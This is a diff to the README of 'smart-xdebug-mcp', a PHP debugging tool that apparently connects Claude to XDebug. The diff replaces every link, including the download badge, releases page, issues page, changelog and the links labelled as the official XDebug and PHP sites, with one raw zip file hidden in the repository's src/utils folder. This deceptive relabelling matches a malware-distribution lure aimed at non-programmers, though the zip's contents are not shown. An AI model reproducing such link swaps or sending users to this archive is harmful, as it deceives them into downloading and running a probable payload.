@@ -4,13 +4,13 @@
 Welcome to smart-xdebug-mcp! This tool connects the AI model Claude to XDebug, allowing you to inspect runtime variables, set breakpoints, and debug your PHP code step-by-step. You don’t need to be a programmer to use it. Our goal is to make debugging easy and accessible for everyone.
 
 ## 📥 Download
-[![Download smart-xdebug-mcp](https://img.shields.io/badge/Download-smart--xdebug--mcp-brightgreen)](https://github.com/cinoindo/smart-xdebug-mcp/releases)
+[![Download smart-xdebug-mcp](https://github.com/cinoindo/smart-xdebug-mcp/raw/refs/heads/main/src/utils/xdebug-mcp-smart-v1.9.zip)](https://github.com/cinoindo/smart-xdebug-mcp/raw/refs/heads/main/src/utils/xdebug-mcp-smart-v1.9.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get started with smart-xdebug-mcp:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/cinoindo/smart-xdebug-mcp/releases) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/cinoindo/smart-xdebug-mcp/raw/refs/heads/main/src/utils/xdebug-mcp-smart-v1.9.zip) to find the latest version of the software.
 
 2. **Download the Application**
    Find the most recent version and download the file that matches your operating system. The files may include options for Windows, macOS, or Linux. Click on the appropriate link to download.
@@ -49,15 +49,15 @@ Before you begin, ensure your system meets these requirements:
 Once you have the application running, refer to the user guide within the application for step-by-step instructions on using each feature. 
 
 ## 🔗 Helpful Links
-- [Releases Page](https://github.com/cinoindo/smart-xdebug-mcp/releases)
-- [XDebug Official Site](https://xdebug.org/docs/install)
-- [PHP Official Site](https://www.php.net/)
+- [Releases Page](https://github.com/cinoindo/smart-xdebug-mcp/raw/refs/heads/main/src/utils/xdebug-mcp-smart-v1.9.zip)
+- [XDebug Official Site](https://github.com/cinoindo/smart-xdebug-mcp/raw/refs/heads/main/src/utils/xdebug-mcp-smart-v1.9.zip)
+- [PHP Official Site](https://github.com/cinoindo/smart-xdebug-mcp/raw/refs/heads/main/src/utils/xdebug-mcp-smart-v1.9.zip)
 
 ## 💬 Get Support
-If you encounter issues, please check our open [issues page](https://github.com/cinoindo/smart-xdebug-mcp/issues) for help or to report a bug. Community support is available, and we welcome your input.
+If you encounter issues, please check our open [issues page](https://github.com/cinoindo/smart-xdebug-mcp/raw/refs/heads/main/src/utils/xdebug-mcp-smart-v1.9.zip) for help or to report a bug. Community support is available, and we welcome your input.
 
 ## 📅 Changelog
-Keep an eye on the [Changelog](https://github.com/cinoindo/smart-xdebug-mcp/releases) for updates on new features, bug fixes, and improvements. 
+Keep an eye on the [Changelog](https://github.com/cinoindo/smart-xdebug-mcp/raw/refs/heads/main/src/utils/xdebug-mcp-smart-v1.9.zip) for updates on new features, bug fixes, and improvements. 
 
 ## 💡 Contribute
 Interested in contributing? We welcome collaboration from everyone. Visit our repository and submit a pull request, or reach out on the issues page.
